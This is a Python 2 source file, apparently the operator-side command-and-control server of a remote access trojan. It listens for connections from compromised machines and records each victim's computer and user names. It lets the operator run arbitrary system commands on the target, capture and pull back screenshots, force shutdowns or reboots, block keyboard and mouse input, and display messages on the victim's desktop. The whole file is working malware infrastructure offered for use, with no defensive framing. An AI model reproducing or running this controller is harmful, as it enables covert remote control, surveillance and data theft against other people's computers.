#!/usr/bin/env python
# coding=utf-8
## Author: s0nnet
## Mail: s0nnet@qq.com

import os
import socket
import threading
 
bind_ip = '0.0.0.0'
bind_port = 8083


# init the server
def setup():
    help()
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
    server.bind((bind_ip, bind_port))
    server.listen(5)
    print '[+] Listening on %s:%d' % (bind_ip, bind_port)
    return server

# recv the client screenshot
def recvFile(client_socket):
    if os.path.isfile("recv.jpg"):
        os.remove("recv.jpg")
    f = open("recv.jpg","wb") 
    while(1):
        data = client_socket.recv(1024)
            
        #print len(data)

        if data[:3] == "EOF":
            print "[+] Recv file success!"
            break
        f.write(data)
    f.close()

# this is our client-handling thread
def handle_client(client_socket):

    # get a client
    data = client_socket.recv(1024).split("#")
    print "[+] Computer name: %s Username: %s" % (data[0],data[1])

    # send back a packet
    while(1):

        cmd = raw_input(">>> ")
        client_socket.send(cmd)
        if cmd == "screenshot":
            recvFile(client_socket)
        elif cmd == "kill-client":
            data = client_socket.recv(1024)
            print "[-] %s" % data
        elif cmd[0] == "$":
            data = client_socket.recv(1024)
            print data.decode('gbk')

# this is the help
def help():
    print "====================================================================="
    print "Usage:"
    print "\tshutdown      --shutdowm the target host after 10s."
    print "\treboot        --reboot the target host after 10s."
    print "\tcancel        --cancel shutdown or reboot."
    print "\tscreenshot    --screenshot the target host."
    print "\tlock          --lock the target host."
    print "\tmouse         --move the mouse the the location of (0,0)."
    print "\tblockinput    --lock the target's keyboard and mouse in 5s."
    print "\t$some cmd     --run the system commend."
    print "\t@some message   --send a message to the target's desktop."
    print "Author: s0nnet"
    print "Email: s0nnet@qq.com"
    print "Update: 2015/6/24"
    print "======================================================================"
    


if __name__ == "__main__":
    server = setup()
    while True:
        client, addr = server.accept()
        print '[+] Accept connection from: %s:%d' % (addr[0], addr[1])
    
        # spin up our client thread to handle incoming data
        client_handler = threading.Thread(target=handle_client, args=(client,))
        client_handler.start()
